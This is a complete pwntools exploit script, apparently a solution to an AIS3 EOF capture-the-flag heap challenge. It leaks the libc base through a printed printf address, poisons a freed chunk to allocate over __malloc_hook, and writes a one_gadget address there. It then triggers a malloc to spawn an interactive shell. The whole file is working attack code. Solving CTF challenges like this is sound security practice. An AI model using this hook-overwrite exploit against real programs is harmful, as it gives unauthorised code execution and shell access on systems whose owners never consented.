#!/usr/bin/python3
from pwn import *

one_gadget = 0x106ef8

def add(size):
    p.sendlineafter(b'choice:', str(1))
    p.sendlineafter(b'Size:', str(size))

def free(offset):
    p.sendlineafter(b'choice:', str(2))
    p.sendlineafter(b'Offset:', str(offset))

def write(data):
    p.sendlineafter(b'choice:', str(3))
    p.sendafter(b'Data:', data.ljust(6, b'\0'))

# p = remote('eof.ais3.org', 10105)
p = process('./tt')
libc = ELF('./libc-2.29.so')

p.recvuntil(b':P ')
libc.address = int(p.recvuntil(b'\n', drop=True), 16) - libc.symbols['printf']
log.info('libc: {:#x}'.format(libc.address))

add(0x60)
free(0)
write(p64(libc.symbols['__malloc_hook'])[:6])
add(0x60)
add(0x60) # get __malloc_hook
write(p64(libc.address + one_gadget)[:6])
add(0x10) # trigger one-gadget

p.interactive()
